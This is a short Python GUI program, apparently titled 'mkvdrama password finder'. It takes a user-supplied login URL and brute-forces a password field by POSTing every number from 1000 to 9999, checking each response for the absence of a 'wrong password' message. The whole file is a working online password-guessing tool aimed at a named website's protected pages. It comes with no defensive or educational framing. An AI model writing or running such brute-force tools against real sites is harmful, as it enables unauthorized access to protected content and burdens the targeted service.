import tkinter
import customtkinter
import requests

def startSearch():
    x = 1000
    y = 10000
    try:
        login_url = link.get()
        password_field = 'pssw'
        for password in range(x, y):
            response = requests.post(login_url, data={password_field: str(password)})
            passwordDisplay.configure(text="Password trial: " + str(password))
            passwordDisplay.update()
            
            # Check if login succeeded by inspecting the response text or status code
            if "you have entered a wrong password" not in response.text:
                print(f"Password found: {password}")
                passwordDisplay.configure(text=str(password), text_color="green")
                break
        else:
            print("Password not found in the range", x, "and", y)
    except Exception as e:
        print(e)

# system settings
customtkinter.set_appearance_mode("System") # system appearance mode (light or dark or custom)
customtkinter.set_default_color_theme("blue")

# app frame
app = customtkinter.CTk()
app.geometry("720x480")
app.title("mkvdrama password finder")


# UI elements

title = customtkinter.CTkLabel(app, text="Insert mkvdrama link")
title.pack(padx=10, pady=10)

# link input
url_var = tkinter.StringVar()
link = customtkinter.CTkEntry(app, width=350, height=40, textvariable=url_var)
link.pack()

# btn
search = customtkinter.CTkButton(app, text="search", command=startSearch)
search.pack(padx=10, pady=10)

# password display
passwordDisplay = customtkinter.CTkLabel(app, text="0")
passwordDisplay.pack(pady=20,padx=10)

# run loop
app.mainloop()
